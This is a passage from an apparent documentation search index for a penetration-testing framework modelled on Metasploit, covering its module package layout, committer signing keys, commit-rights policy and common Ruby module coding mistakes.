execu\u00e7\u00e3o (veja abaixo), ainda \u00e9 inestim\u00e1vel saber como algo foi constru\u00eddo em primeiro lugar. Blobs e fontes As fontes s\u00e3o \u00fateis, deve ser f\u00e1cil encontr\u00e1-las! Agora eles viver\u00e3o no m\u00f3dulo no diret\u00f3rio src / Na medida do poss\u00edvel, apenas as fontes devem ser verificadas na \u00e1rvore. Por\u00e9m, para plataformas superespec\u00edficas direcionadas a coisas, isso nem sempre \u00e9 vi\u00e1vel (por exemplo, projetos do VisualStudio). Em momentos como esse, o diret\u00f3rio {{data /}} deve ser usado. Como mencionado acima Blobs ou ativos sem uma fonte de check-in tamb\u00e9m pertencem a dados /, como imagens ou itens baixados. As coisas para as explora\u00e7\u00f5es de clientes para download provavelmente tamb\u00e9m devem aparecer aqui, como arquivos HTML e JavaScripts est\u00e1ticos Modelos usando o thgc voce consegue criara modelos de class e modelos de plugins Documentos O diret\u00f3rio docs / conter\u00e1 os arquivos aos quais o usu\u00e1rio far\u00e1 refer\u00eancia ao tentar entender o m\u00f3dulo. Isso pode incluir PoCs, descontos, pcaps etc. Ferramentas adicionais Uma vantagem que essa estrutura de diret\u00f3rios nos oferece \u00e9 a capacidade de escrever ferramentas melhores para ela do que para a itera\u00e7\u00e3o atual dos m\u00f3dulos. Uma desvantagem \u00e9 que precisamos disso para tornar o formato acess\u00edvel aos hackers. Tarefas de constru\u00e7\u00e3o compartilhadas Como todas as tarefas rotineiras orientadas ao m\u00f3dulo ser\u00e3o executadas com tarefas de python, precisaremos tornar as a\u00e7\u00f5es padr\u00e3o para essas tarefas o mais inteligentes e reutiliz\u00e1veis poss\u00edvel em diferentes tipos / implementa\u00e7\u00f5es de m\u00f3dulos. O autor do m\u00f3dulo n\u00e3o deve se preocupar em escrever o encanamento de que n\u00e3o precisa (ou \u00e9 comum) ou mexer com o encanamento que esteja relacionado apenas tangencialmente \u00e0 sua necessidade exclusiva. Para esse fim, devemos ter padr\u00f5es saud\u00e1veis para o {} seguinte, no m\u00ednimo: Gera\u00e7\u00e3o de m\u00f3dulos No m\u00ednimo, tamb\u00e9m precisaremos de ferramentas para criar um m\u00f3dulo quase vazio, logo usamos os thgc","title":"M\u00f3dulos inclu\u00eddos"},{"location":"dev/dark/Bundled-Modules-Proposal/#modulos-incluidos","text":"Criado por darkcode0x00 \u00c0 medida que os m\u00f3dulos Metasploit continuam a crescer em n\u00famero e capacidade, a atual separa\u00e7\u00e3o das informa\u00e7\u00f5es dos m\u00f3dulos por tipo se torna mais complicada. A partir do pr\u00f3ximo ano, queremos que todos os arquivos relacionados a um m\u00f3dulo (documentos, bibliotecas, fontes, informa\u00e7\u00f5es de compila\u00e7\u00e3o, etc.) vivam o mais pr\u00f3ximo poss\u00edvel e sejam o mais hacker poss\u00edvel. Para esse fim, criamos o conceito de \"pacotes de m\u00f3dulos\" para ajudar a melhorar o isolamento de depend\u00eancias do m\u00f3dulo e a localiza\u00e7\u00e3o das informa\u00e7\u00f5es. Esperamos que o formato seja flex\u00edvel o suficiente para acomodar a ampla gama de m\u00f3dulos que temos e uniforme o suficiente para n\u00e3o causar confus\u00e3o entre os membros da comunidade e colaboradores. Eventualmente, podemos at\u00e9 empacotar cada m\u00f3dulo separadamente para distribui\u00e7\u00e3o. \u00c9 incerto se esse formato de pacote suportar\u00e1 ou n\u00e3o o estilo antigo do m\u00f3dulo. Poderia ser feito para funcionar, eu acho, mas exigiria um pouco de esfor\u00e7o e ingenuidade para funcionar corretamente. Por uma quest\u00e3o de simplicidade, descreverei o conceito de pacote como ele se aplica aos m\u00f3dulos externos / coldstone e, em seguida, descreverei poss\u00edveis adapta\u00e7\u00f5es no final.","title":"M\u00f3dulos inclu\u00eddos"},{"location":"dev/dark/Bundled-Modules-Proposal/#estrutura-do-diretorio-class-plugin","text":"Exemplo de m\u00f3dulo python : thgc create darkcode -t thgclass tree --dirsfirst --charset=ascii -F class_name/ class_plugins_name/ |-- docs/ |-- imagens/ |-- requirements/ | |-- base.txt | |-- dev.txt | |-- prod.txt | `-- test.txt |-- test_thg_plugin_class/ | |-- __init__.py | |-- pylintrc | `-- test_myplugin.py |-- thg_plugin_class/ | `-- source/ | |-- __init__.py | |-- myplugin.py | `-- pylintrc |-- thg_plugin_class_example/ | `-- example.py |-- build-pyenvs.sh |-- CHANGELOG.md |-- LICENSE.md |-- Pipfile |-- Pipfile.lock |-- README.md |-- setup.cfg |-- setup.py |-- tasks.py `-- tox.init 7 directories, 21 files","title":"Estrutura do diret\u00f3rio class / plugin"},{"location":"dev/dark/Bundled-Modules-Proposal/#plugin","text":"thgc create plugins_name -t thgplugin root@darkcode:/# tree --dirsfirst --charset=ascii -F plugins_name/ plugins_name/ |-- docs/ |-- imagens/ |-- requirements/ | |-- base.txt | |-- dev.txt | |-- prod.txt | `-- test.txt |-- test_thg_plugin/ | |-- __init__.py | |-- pylintrc | `-- test_myplugin.py |-- thg_plugin/ | `-- source/ | |-- __init__.py | |-- pylintrc | `-- thg_plugin.py |-- thg_plugin_example/ | `-- thg_plugin.py |-- build-pyenvs.sh |-- CHANGELOG.md |-- LICENSE.md |-- Pipfile |-- Pipfile.lock |-- README.md |-- setup.cfg |-- setup.py |-- tasks.py `-- tox.init 7 directories, 21 files","title":"plugin"},{"location":"dev/dark/Bundled-Modules-Proposal/#modulos-info","text":"- O execut\u00e1vel principal recebe o nome do m\u00f3dulo (igual ao diret\u00f3rio) - Os arquivo do modulos s\u00e3o todos corelacionados - N\u00f3s permitiremos v\u00e1rios m\u00f3dulos, tendo intera\u00e7\u00e3o um com outro, porem n\u00e3o recomendamos essa estrutura de dependencia (por exemplo, integra\u00e7\u00e3o 2 dois modulos simutaneamente, recomendo submeter a brach master para realaplicao do modulo com depend\u00eancia multiplas)","title":"modulos info"},{"location":"dev/dark/Bundled-Modules-Proposal/#arquivos-necessarios","text":"Para manter a sobrecarga no m\u00ednimo para os hackers que est\u00e3o desenvolvendo m\u00f3dulos, precisamos minimizar os arquivos que o autor precisar\u00e1 criar, modificar e entender para a maioria das tarefas (atualizado: todos os arquivos que um autor deve criar devem estar diretamente relacionados a determinados e especializados funcionalidade que eles desejam como parte da prepara\u00e7\u00e3o ou execu\u00e7\u00e3o de um m\u00f3dulo). O m\u00f3dulo mais m\u00ednimo requer apenas que o execut\u00e1vel principal esteja presente. Ao carregar os m\u00f3dulos, o framework ver\u00e1 um diret\u00f3rio principal sem certos arquivos esperados e gerar\u00e1 os padr\u00e3o automaticamente. Esse comportamento pode ser posteriormente aumentado com a adivinha\u00e7\u00e3o de quais padr\u00f5es com base no que est\u00e1 presente no diret\u00f3rio. - Se o pyinvoke estiver ausente, o framework ir\u00e1 gerar um que fa\u00e7a refer\u00eancia \u00e0s tarefas de py compartilhadas. - Se o pipenv estiver ausente e o execut\u00e1vel terminar em .py, o framework ir\u00e1 gerar um que dependa das bibliotecas do modulo. - Toda essa l\u00f3gica de gera\u00e7\u00e3o deve estar dispon\u00edvel no thgscaffolding","title":"Arquivos necess\u00e1rios"},{"location":"dev/dark/Bundled-Modules-Proposal/#mantendo-tudo-perto","text":"Uma das desvantagens do sistema de m\u00f3dulos atual \u00e9 que todos os arquivos relacionados ao desenvolvimento, documenta\u00e7\u00e3o e execu\u00e7\u00e3o de um m\u00f3dulo vivem em locais diferentes. Algumas informa\u00e7\u00f5es, como depend\u00eancias, s\u00e3o rastreadas apenas implicitamente ou com perdas no c\u00f3digo ou nas especifica\u00e7\u00f5es de n\u00edvel superior da estrutura. Isso determina de forma program\u00e1tica o que \u00e9 um m\u00f3dulo, \u00e9 direcionado ou requer um c\u00f3digo fr\u00e1gil.","title":"Mantendo tudo perto"},{"location":"dev/dark/Bundled-Modules-Proposal/#informacoes-da-versao","text":"Todas as informa\u00e7\u00f5es adicionais de compila\u00e7\u00e3o devem ser especificadas como tarefas do m\u00f3dulo desenvolvido. Tanto quanto poss\u00edvel, isso tamb\u00e9m deve incluir a cria\u00e7\u00e3o de ambientes IDE, como o Visual Studio. Mesmo que os bin\u00e1rios sejam verificados para reduzir os requisitos de tempo de execu\u00e7\u00e3o (veja abaixo), ainda \u00e9 inestim\u00e1vel saber como algo foi constru\u00eddo em primeiro lugar.","title":"Informa\u00e7\u00f5es da vers\u00e3o"},{"location":"dev/dark/Bundled-Modules-Proposal/#blobs-e-fontes","text":"As fontes s\u00e3o \u00fateis, deve ser f\u00e1cil encontr\u00e1-las! Agora eles viver\u00e3o no m\u00f3dulo no diret\u00f3rio src / Na medida do poss\u00edvel, apenas as fontes devem ser verificadas na \u00e1rvore. Por\u00e9m, para plataformas superespec\u00edficas direcionadas a coisas, isso nem sempre \u00e9 vi\u00e1vel (por exemplo, projetos do VisualStudio). Em momentos como esse, o diret\u00f3rio {{data /}} deve ser usado. Como mencionado acima Blobs ou ativos sem uma fonte de check-in tamb\u00e9m pertencem a dados /, como imagens ou itens baixados. As coisas para as explora\u00e7\u00f5es de clientes para download provavelmente tamb\u00e9m devem aparecer aqui, como arquivos HTML e JavaScripts est\u00e1ticos","title":"Blobs e fontes"},{"location":"dev/dark/Bundled-Modules-Proposal/#modelos","text":"usando o thgc voce consegue criara modelos de class e modelos de plugins","title":"Modelos"},{"location":"dev/dark/Bundled-Modules-Proposal/#documentos","text":"O diret\u00f3rio docs / conter\u00e1 os arquivos aos quais o usu\u00e1rio far\u00e1 refer\u00eancia ao tentar entender o m\u00f3dulo. Isso pode incluir PoCs, descontos, pcaps etc.","title":"Documentos"},{"location":"dev/dark/Bundled-Modules-Proposal/#ferramentas-adicionais","text":"Uma vantagem que essa estrutura de diret\u00f3rios nos oferece \u00e9 a capacidade de escrever ferramentas melhores para ela do que para a itera\u00e7\u00e3o atual dos m\u00f3dulos. Uma desvantagem \u00e9 que precisamos disso para tornar o formato acess\u00edvel aos hackers.","title":"Ferramentas adicionais"},{"location":"dev/dark/Bundled-Modules-Proposal/#tarefas-de-construcao-compartilhadas","text":"Como todas as tarefas rotineiras orientadas ao m\u00f3dulo ser\u00e3o executadas com tarefas de python, precisaremos tornar as a\u00e7\u00f5es padr\u00e3o para essas tarefas o mais inteligentes e reutiliz\u00e1veis poss\u00edvel em diferentes tipos / implementa\u00e7\u00f5es de m\u00f3dulos. O autor do m\u00f3dulo n\u00e3o deve se preocupar em escrever o encanamento de que n\u00e3o precisa (ou \u00e9 comum) ou mexer com o encanamento que esteja relacionado apenas tangencialmente \u00e0 sua necessidade exclusiva. Para esse fim, devemos ter padr\u00f5es saud\u00e1veis para o {} seguinte, no m\u00ednimo:","title":"Tarefas de constru\u00e7\u00e3o compartilhadas"},{"location":"dev/dark/Bundled-Modules-Proposal/#geracao-de-modulos","text":"No m\u00ednimo, tamb\u00e9m precisaremos de ferramentas para criar um m\u00f3dulo quase vazio, logo usamos os thgc","title":"Gera\u00e7\u00e3o de m\u00f3dulos"},{"location":"dev/dark/Committer-Keys/","text":"Esta p\u00e1gina lista as chaves em uso por [THG committers] [thg-committers] e pode ser usado para verificar as confirma\u00e7\u00f5es de mesclagem feitas em https://gitlab.com/darkcode357/thg-framework/ . Identidades do Keybase.io O Keybase.io \u00e9 usado pelo THG como uma maneira f\u00e1cil de verificar as identidades dos confirmadores. Se voc\u00ea \u00e9 um colaborador do THG HACKER GROUP e precisa de um convite, basta perguntar. Gitlab Username Keybase.io Username @darkcode357 acammackr7 @KillerBean bcoles Note, keybase.io does not require your private key to prove your GitHub identity. Actually sharing your private key with Keybase.io is a matter of contention -- here's the usual argument against , and here's one thoughtful argument for . As all Metasploit Framework committers are quite comfortable with the command line, there should be no need to store your (encrypted) private key with a third party. So, please don't, unless you have amazingly good reasons (and a great local password). Tracking criteria In order to get @bcook-r7 to track your key, you alert him to its existence through some non-GitHub means, and verify your GitHub username. That's all there is to it. It would be sociable to track him (and everyone else on this list) back. Tracking is essentially \"trusting\" and \"verifying\" -- see the much longer discussion here . Signing your commits and merges Contributors are encouraged to sign commits, while Metasploit committers are required to sign their merge commits. Note that the name and e-mail address must match the information on the signing key exactly. To begin: Generate a signing key, if you don't have one already, using your favorite PGP/GPG interface: $ gpg --gen-key gpg (GnuPG) 1.4.20; Copyright (C) 2015 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) Your selection? 4 RSA keys may be between 1024 and 4096 bits long. What keysize do you want? (2048) Requested keysize is 2048 bits Please specify how long the key should be valid. 0 = key does not expire <n> = key expires in n days <n>w = key expires in n weeks <n>m = key expires in n months <n>y = key expires in n years Key is valid for? (0) 1y Key expires at Fri 20 Dec 2019 01:38:11 PM CST Is this correct? (y/N) y You need a user ID to identify your key; the software constructs the user ID from the Real Name, Comment and Email Address in this form: \"Heinrich Heine (Der Dichter) <heinrichh@duesseldorf.de>\" Real name: Dade Murphy Email address: dmurphy@thegibson.example Comment: You selected this USER-ID: \"Dade Murphy <dmurphy@thegibson.example>\" Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o You need a Passphrase to protect your secret key. Enter passphrase: [...] Modify your .git/config file to enable signing commits and merges by default: [user] name = Your Name email = your_email@example.com signingkey = DEADBEEF # Must match name and email exactly! [alias] c = commit -S --edit m = merge -S --no-ff --edit Using git c and git m from now on will sign every commit with your DEADBEEF key. However, note that rebasing or cherry-picking commits will change the commit hash, and therefore, unsign the commit -- to resign the most recent, use git c --amend .","title":"Committer Keys"},{"location":"dev/dark/Committer-Keys/#identidades-do-keybaseio","text":"O Keybase.io \u00e9 usado pelo THG como uma maneira f\u00e1cil de verificar as identidades dos confirmadores. Se voc\u00ea \u00e9 um colaborador do THG HACKER GROUP e precisa de um convite, basta perguntar. Gitlab Username Keybase.io Username @darkcode357 acammackr7 @KillerBean bcoles Note, keybase.io does not require your private key to prove your GitHub identity. Actually sharing your private key with Keybase.io is a matter of contention -- here's the usual argument against , and here's one thoughtful argument for . As all Metasploit Framework committers are quite comfortable with the command line, there should be no need to store your (encrypted) private key with a third party. So, please don't, unless you have amazingly good reasons (and a great local password).","title":"Identidades do Keybase.io"},{"location":"dev/dark/Committer-Keys/#tracking-criteria","text":"In order to get @bcook-r7 to track your key, you alert him to its existence through some non-GitHub means, and verify your GitHub username. That's all there is to it. It would be sociable to track him (and everyone else on this list) back. Tracking is essentially \"trusting\" and \"verifying\" -- see the much longer discussion here .","title":"Tracking criteria"},{"location":"dev/dark/Committer-Keys/#signing-your-commits-and-merges","text":"Contributors are encouraged to sign commits, while Metasploit committers are required to sign their merge commits. Note that the name and e-mail address must match the information on the signing key exactly. To begin: Generate a signing key, if you don't have one already, using your favorite PGP/GPG interface: $ gpg --gen-key gpg (GnuPG) 1.4.20; Copyright (C) 2015 Free Software Foundation, Inc. This is free software: you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law. Please select what kind of key you want: (1) RSA and RSA (default) (2) DSA and Elgamal (3) DSA (sign only) (4) RSA (sign only) Your selection? 4 RSA keys may be between 1024 and 4096 bits long. What keysize do you want? (2048) Requested keysize is 2048 bits Please specify how long the key should be valid. 0 = key does not expire <n> = key expires in n days <n>w = key expires in n weeks <n>m = key expires in n months <n>y = key expires in n years Key is valid for? (0) 1y Key expires at Fri 20 Dec 2019 01:38:11 PM CST Is this correct? (y/N) y You need a user ID to identify your key; the software constructs the user ID from the Real Name, Comment and Email Address in this form: \"Heinrich Heine (Der Dichter) <heinrichh@duesseldorf.de>\" Real name: Dade Murphy Email address: dmurphy@thegibson.example Comment: You selected this USER-ID: \"Dade Murphy <dmurphy@thegibson.example>\" Change (N)ame, (C)omment, (E)mail or (O)kay/(Q)uit? o You need a Passphrase to protect your secret key. Enter passphrase: [...] Modify your .git/config file to enable signing commits and merges by default: [user] name = Your Name email = your_email@example.com signingkey = DEADBEEF # Must match name and email exactly! [alias] c = commit -S --edit m = merge -S --no-ff --edit Using git c and git m from now on will sign every commit with your DEADBEEF key. However, note that rebasing or cherry-picking commits will change the commit hash, and therefore, unsign the commit -- to resign the most recent, use git c --amend .","title":"Signing your commits and merges"},{"location":"dev/dark/Committer-Rights/","text":"Metasploit Committers The term \"Metasploit Committers\" describes people who have direct write access to the Rapid7 Metasploit-Framework fork . These are the people who can land changes to this main fork of the Framework. However, it is not necessary to have committer rights in order to contribute to Metasploit. Much of our code comes from non-committers. We encourage anyone to fork the Metasploit project, make changes, fix bugs, and notify the core committers about those changes via Pull Requests . The process for getting started is most comprehensively documented in the Metasploit Development Environment setup guide. Metasploit committers are a mix of Rapid7 employees and outside contributors. Anyone can become a contributor, with the following expectations: Committers are empowered to participate in code review, help newbies, and be positive role models in the larger development community. Committers are likely to take up chores such as writing documentation, evangelization, writing test cases, and code review. Committers help maintain the character of the Metasploit Framework as a truly independent open source project. The Metasploit community is built on the core belief that open contributions and open discussion of security issues has strong benefits for the Internet in general and human society as a whole. By helping each other demonstrate security vulnerabilities and exposures, we foster a community of excellent, ethical practitioners of information security. How to be a Committer Committers tend to review pull requests that come in from other committers and from the wider Metasploit community. Committers generally should not land their own code without some sort of review from another contributor or committer. For most changes, please open a pull request. In addition, always ask for someone to review your work. Even simple fixes might be better done otherwise. If you get no feedback on your pull requests, ask again. Be annoying if necessary! Don't submit a pull request or make a comment and let it rot because nobody responds. Pull requests should be merged with a git merge -S --no-ff in order to ensure a merge commit is always generated, and your merge commit is signed with your PGP key. Avoid clicking the green \"merge\" button in Github in order to avoid race conditions with landing code that may sneak past review, and of course, so you can sign your commits. If you reject a pull request, be clear in the pull request why it was rejected, with some effort made to point at helpful resources for next time. Most people don't often commit to open source code, so when someone does, please be respectful of their efforts. Even if someone else approves of a pull request, and it is shown to be broken later, then it is still your responsibility to correct it. Make every effort to get a fix or revert in as soon as possible, whether you wrote the code, landed it, or approved it. Blame is shared equally. A list of committer public keys is here . How to Gain Commit Rights Commit rights are granted via votes on the committers mailing list. Voting records are archived for the benefit for current and future committers. Any current committer may nominate any one person as a potential committer by writing to the committers mailing list. The nominator must provide a justification for committer rights, and include the nominee's e-mail address. After some discussion on the mailing list, there will be a group vote on the nominee. The Metasploit manager (@busterb) will inform the new committer of their new commit rights and responsibilities, add the new committer to the appropriate ACL groups and mailing lists, and inform the mailing list of the successful completion of these tasks. Committers introduced in this way will have commit rights to the public framework repositories . How to Lose Commit Rights Committer rights are not granted strictly on the basis of proven code quality; committer rights are a statement of trust by the existing body of committers, so there are highly subjective criteria in play as well. Elements like an agreeable personality, the ability to remain calm in the face of trolling, the avoidance of criminal proceedings, and other aspects of a committer's life all play a part in the initial granting of commit access. Breaches of trust in terms of malicious or malformed code, or the demonstration of poor judgement that would reflect poorly on the Metasploit project will lead to a discussion on the committer mailing list, and which is likely result in the removal of committer rights. Useful Links for Committers http://r-7.co/MSF-DEV is pretty much required reading. So is CONTRIBUTING.md Check out the Apache Software Foundation's Guide for Committers . It's illuminating. Producing Open Source Software by Ken Fogel is a must-read. Zach Holman's Open Source Misfeasance slides -- the video is gone! How to Survive Poisonous People by Ben Collins-Sussman and Brian Fitzpatrick The Netiquette RFC is about how to be polite.","title":"Metasploit Committers"},{"location":"dev/dark/Committer-Rights/#metasploit-committers","text":"The term \"Metasploit Committers\" describes people who have direct write access to the Rapid7 Metasploit-Framework fork . These are the people who can land changes to this main fork of the Framework. However, it is not necessary to have committer rights in order to contribute to Metasploit. Much of our code comes from non-committers. We encourage anyone to fork the Metasploit project, make changes, fix bugs, and notify the core committers about those changes via Pull Requests . The process for getting started is most comprehensively documented in the Metasploit Development Environment setup guide. Metasploit committers are a mix of Rapid7 employees and outside contributors. Anyone can become a contributor, with the following expectations: Committers are empowered to participate in code review, help newbies, and be positive role models in the larger development community. Committers are likely to take up chores such as writing documentation, evangelization, writing test cases, and code review. Committers help maintain the character of the Metasploit Framework as a truly independent open source project. The Metasploit community is built on the core belief that open contributions and open discussion of security issues has strong benefits for the Internet in general and human society as a whole. By helping each other demonstrate security vulnerabilities and exposures, we foster a community of excellent, ethical practitioners of information security.","title":"Metasploit Committers"},{"location":"dev/dark/Committer-Rights/#how-to-be-a-committer","text":"Committers tend to review pull requests that come in from other committers and from the wider Metasploit community. Committers generally should not land their own code without some sort of review from another contributor or committer. For most changes, please open a pull request. In addition, always ask for someone to review your work. Even simple fixes might be better done otherwise. If you get no feedback on your pull requests, ask again. Be annoying if necessary! Don't submit a pull request or make a comment and let it rot because nobody responds. Pull requests should be merged with a git merge -S --no-ff in order to ensure a merge commit is always generated, and your merge commit is signed with your PGP key. Avoid clicking the green \"merge\" button in Github in order to avoid race conditions with landing code that may sneak past review, and of course, so you can sign your commits. If you reject a pull request, be clear in the pull request why it was rejected, with some effort made to point at helpful resources for next time. Most people don't often commit to open source code, so when someone does, please be respectful of their efforts. Even if someone else approves of a pull request, and it is shown to be broken later, then it is still your responsibility to correct it. Make every effort to get a fix or revert in as soon as possible, whether you wrote the code, landed it, or approved it. Blame is shared equally. A list of committer public keys is here .","title":"How to be a Committer"},{"location":"dev/dark/Committer-Rights/#how-to-gain-commit-rights","text":"Commit rights are granted via votes on the committers mailing list. Voting records are archived for the benefit for current and future committers. Any current committer may nominate any one person as a potential committer by writing to the committers mailing list. The nominator must provide a justification for committer rights, and include the nominee's e-mail address. After some discussion on the mailing list, there will be a group vote on the nominee. The Metasploit manager (@busterb) will inform the new committer of their new commit rights and responsibilities, add the new committer to the appropriate ACL groups and mailing lists, and inform the mailing list of the successful completion of these tasks. Committers introduced in this way will have commit rights to the public framework repositories .","title":"How to Gain Commit Rights"},{"location":"dev/dark/Committer-Rights/#how-to-lose-commit-rights","text":"Committer rights are not granted strictly on the basis of proven code quality; committer rights are a statement of trust by the existing body of committers, so there are highly subjective criteria in play as well. Elements like an agreeable personality, the ability to remain calm in the face of trolling, the avoidance of criminal proceedings, and other aspects of a committer's life all play a part in the initial granting of commit access. Breaches of trust in terms of malicious or malformed code, or the demonstration of poor judgement that would reflect poorly on the Metasploit project will lead to a discussion on the committer mailing list, and which is likely result in the removal of committer rights.","title":"How to Lose Commit Rights"},{"location":"dev/dark/Committer-Rights/#useful-links-for-committers","text":"http://r-7.co/MSF-DEV is pretty much required reading. So is CONTRIBUTING.md Check out the Apache Software Foundation's Guide for Committers . It's illuminating. Producing Open Source Software by Ken Fogel is a must-read. Zach Holman's Open Source Misfeasance slides -- the video is gone! How to Survive Poisonous People by Ben Collins-Sussman and Brian Fitzpatrick The Netiquette RFC is about how to be polite.","title":"Useful Links for Committers"},{"location":"dev/dark/Common-Metasploit-Module-Coding-Mistakes/","text":"Deprecation notice! Please see CONTRIBUTING.md for an authoritative coding guide. This document has fallen out of date. We don't write bad code any more! Hooray! This is a collection of all the bad code we often see in Metasploit modules. You should avoid them, too. Note: Some of these examples use puts() for demo purposes, but you should always use print_status / print_error when writing a module. Bad Examples You Should NOT Follow: Not checking the return value of a Metasploit API Ruby 1.9.3 vs 1.8.7... gotcha! Not checking the return value when using match() Not checking nil before accessing a method Using exception handling to shut an error up Not taking advantage of the 'ensure' block Adding the 'VERBOSE' option Avoid using 'vars_post' for send_request_cgi() when crafting a POST request Bad variable naming style Using global variables Modifying the datastore during execution 1. Not checking the return value of a Metasploit API res = send_request_cgi ({ 'method' => 'GET' , 'uri' => '/app/index.php' }) # There's a bug here, because res can return nil (due to a timeout or other reasons) # If that happens, you will hit a \"undefined method `code' for nil:NilClass\" error. # The correct way should be: if res && res.code == 200 if res . code == 200 print_status ( \"Response looks good\" ) else print_error ( \"Unexpected response\" ) end 2. Ruby 1.9.3 vs 1.8.7... gotcha! some_string = \"ABC\" # This can cause unexpected results to your module. # Better to always do: char = some_string[1, 1] char = some_string [ 1 ] if char == 'B' puts \"You will see this message in Ruby 1.9.3\" elsif char == 66 puts \"You will see this message in Ruby 1.8.7\" end # 1.9 allows a comma after the last argument when calling # a method while 1.8 does not. The most common place to # see this error is in the update_info() section in a # module's constructor. some_method ( \"arg1\" , \"arg2\" , # <-- This comma is a syntax error on 1.8.x ) 3. Not checking the return value when using match() str = \"dragon! drag on! Not lizard, I don't do that tongue thing\" # This tries to print \"Not snake\", but it's not in the string, # so you'll get this error: \"undefined method `[]' for nil:NilClass\" puts str . match ( /(Not snake)/ ) [ 0 ] # The above is better written as: if ( str =~ /(Not snake)/ ) puts $1 end 4. Not checking nil first before accessing a method str = \"These things are round and tasty, let's call them... tastycles!\" food = str . scan ( /donut holes/ ) [ 0 ] # food is nil, and nil has no method called \"empty\". # This will throw an error: \"undefined method `empty?' for nil:NilClass\" if food . empty? or food . nil? puts \"I don't know what it's called\" end 5. Using exception handling to shut an error up begin # This block has 2 issues: # Issue #1: sample() is not a method in 1.8.7 # Issue #2: Divided by 0 (race condition) n = [ 0 , 1 , 2 , 3 , 4 , 5 ]. sample 1 / n rescue # If the user reports a bug saying this code isn't # working, it can be hard to debug exactly what went # wrong for the user without a backtrace. # When you do this, the error also won't be logged in # framework.log, either. # Note that rescuing ::Exception is especially harmful # because it can even hide syntax errors. end 6. Not taking advantage of the 'ensure' block # You should use the ensure block to make sure x always has a value, # which also avoids repeating code begin n = [ 0 , 1 , 2 ]. sample x = 1 / n rescue ZeroDivisionError => e puts \"Are you smarter than a 5th grader? #{ e . message } \" x = 0 # Can put this in the ensure block rescue NoMethodError puts \"You must be using an older Ruby\" x = 0 # Can put this in the ensure block end puts \"Value is #{ x . to_s } \" 7. Adding the 'VERBOSE' option register_options ( [ # You already have this. Just type 'show advanced' and you'll see it. # So no need to register again OptBool . new ( \"VERBOSE\" , [ false , 'Enable detailed status messages' , false ] ) ] , self . class ) 8. Avoid using send_request_cgi()'s vars_get or vars_get when crafting a POST/GET request data_post = 'user=jsmith&pass=hello123' # You should use the 'vars_post' key instead of 'data', # unless you're trying to avoid the API escaping your # parameter names send_request_cgi ({ 'method' => 'POST' , 'uri' => '/' , 'data' => data_post }) 9. Bad variable naming style # What's this, Java? # The proper naming style in this case should be: my_string myString = \"hello, world\" 10. Using global variables # $msg is a global variable that can be accessed anywhere within the program. # This can induce bugs to other modules or mixins that are hard to debug. # Use @instance variables instead. # This is also mentioned in your HACKING file :-) class Opinion def initialize # This variable shouldn't be shared with other classes $msg = \"It's called the Freedom of Information Act. The Hippies finally got something right.\" end end class Metasploit3 def initialize puts $msg end end Opinion . new Metasploit3 . new 11. Modifying the datastore during execution # https://github.com/rapid7/metasploit-framework/issues/3853 datastore [ 'BAD' ] = 'This is bad.'","title":"Deprecation notice!"},{"location":"dev/dark/Common-Metasploit-Module-Coding-Mistakes/#deprecation-notice","text":"Please see CONTRIBUTING.md for an authoritative coding guide. This document has fallen out of date. We don't write bad code any more! Hooray! This is a collection of all the bad code we often see in Metasploit modules. You should avoid them, too. Note: Some of these examples use puts() for demo purposes, but you should always use print_status / print_error when writing a module.","title":"Deprecation notice!"},{"location":"dev/dark/Common-Metasploit-Module-Coding-Mistakes/#bad-examples-you-should-not-follow","text":"Not checking the return value of a Metasploit API Ruby 1.9.3 vs 1.8.7... gotcha! Not checking the return value when using match() Not checking nil before accessing a method Using exception handling to shut an error up Not taking advantage of the 'ensure' block Adding the 'VERBOSE' option Avoid using 'vars_post' for send_request_cgi() when crafting a POST request Bad variable naming style Using global variables Modifying the datastore during execution 1. Not checking the return value of a Metasploit API res = send_request_cgi ({ 'method' => 'GET' , 'uri' => '/app/index.php' }) # There's a bug here, because res can return nil (due to a timeout or other reasons) # If that happens, you will hit a \"undefined method `code' for nil:NilClass\" error. # The correct way should be: if res && res.code == 200 if res . code == 200 print_status ( \"Response looks good\" ) else print_error ( \"Unexpected response\" ) end 2. Ruby 1.9.3 vs 1.8.7... gotcha! some_string = \"ABC\" # This can cause unexpected results to your module. # Better to always do: char = some_string[1, 1] char = some_string [ 1 ] if char == 'B' puts \"You will see this message in Ruby 1.9.3\" elsif char == 66 puts \"You will see this message in Ruby 1.8.7\" end # 1.9 allows a comma after the last argument when calling # a method while 1.8 does not. The most common place to # see this error is in the update_info() section in a # module's constructor. some_method ( \"arg1\" , \"arg2\" , # <-- This comma is a syntax error on 1.8.x ) 3. Not checking the return value when using match() str = \"dragon! drag on! Not lizard, I don't do that tongue thing\" # This tries to print \"Not snake\", but it's not in the string, # so you'll get this error: \"undefined method `[]' for nil:NilClass\" puts str . match ( /(Not snake)/ ) [ 0 ] # The above is better written as: if ( str =~ /(Not snake)/ ) puts $1 end 4. Not checking nil first before accessing a method str = \"These things are round and tasty, let's call them... tastycles!\" food = str . scan ( /donut holes/ ) [ 0 ] # food is nil, and nil has no method called \"empty\". # This will throw an error: \"undefined method `empty?' for nil:NilClass\" if food . empty? or food . nil? puts \"I don't know what it's called\" end 5. Using exception handling to shut an error up begin # This block has 2 issues: # Issue #1: sample() is not a method in 1.8.7 # Issue #2: Divided by 0 (race condition) n = [ 0 , 1 , 2 , 3 , 4 , 5 ]. sample 1 / n rescue # If the user reports a bug saying this code isn't # working, it can be hard to debug exactly what went # wrong for the user without a backtrace. # When you do this, the error also won't be logged in # framework.log, either. # Note that rescuing ::Exception is especially harmful # because it can even hide syntax errors. end 6. Not taking advantage of the 'ensure' block # You should use the ensure block to make sure x always has a value, # which also avoids repeating code begin n = [ 0 , 1 , 2 ]. sample x = 1 / n rescue ZeroDivisionError => e puts \"Are you smarter than a 5th grader? #{ e . message } \" x = 0 # Can put this in the ensure block rescue NoMethodError puts \"You must be using an older Ruby\" x = 0 # Can put this in the ensure block end puts \"Value is #{ x . to_s } \" 7. Adding the 'VERBOSE' option register_options ( [ # You already have this. Just type 'show advanced' and you'll see it. # So no need to register again OptBool . new ( \"VERBOSE\" , [ false , 'Enable detailed status messages' , false ] ) ] , self . class ) 8. Avoid using send_request_cgi()'s vars_get or vars_get when crafting a POST/GET request data_post = 